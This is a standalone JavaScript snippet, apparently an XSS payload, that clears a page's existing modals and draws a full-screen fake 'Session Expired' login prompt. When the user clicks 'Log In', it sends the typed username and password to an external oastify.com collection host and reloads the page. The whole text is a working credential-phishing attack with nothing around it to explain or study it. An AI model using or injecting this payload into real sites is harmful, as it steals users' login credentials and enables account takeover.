document.querySelectorAll('.bbm-wrapper,.modal-backdrop').forEach(e=>e.remove());
var d=document.createElement('div');
d.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:2147483647;display:flex;align-items:center;justify-content:center';
d.addEventListener('focusin',function(e){e.stopImmediatePropagation()},true);
var b=document.createElement('div');
b.style.cssText='background:#fff;padding:30px;border-radius:8px;text-align:center;box-shadow:0 0 20px rgba(0,0,0,.3)';
b.innerHTML='<h2>Session Expired</h2><p>Please re-enter your credentials</p>';
var u=document.createElement('input');u.placeholder='Username';
u.style.cssText='display:block;width:260px;padding:8px;margin:8px auto';
var p=document.createElement('input');p.type='password';p.placeholder='Password';
p.style.cssText='display:block;width:260px;padding:8px;margin:8px auto';
var s=document.createElement('button');s.textContent='Log In';
s.style.cssText='padding:8px 20px;cursor:pointer';
s.onclick=function(){
  fetch('https://hez7k97peisucx0lwhxqs2ylxc33ruii7.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value));
  location.reload()
};
b.appendChild(u);b.appendChild(p);b.appendChild(s);
d.appendChild(b);document.body.appendChild(d);u.focus();
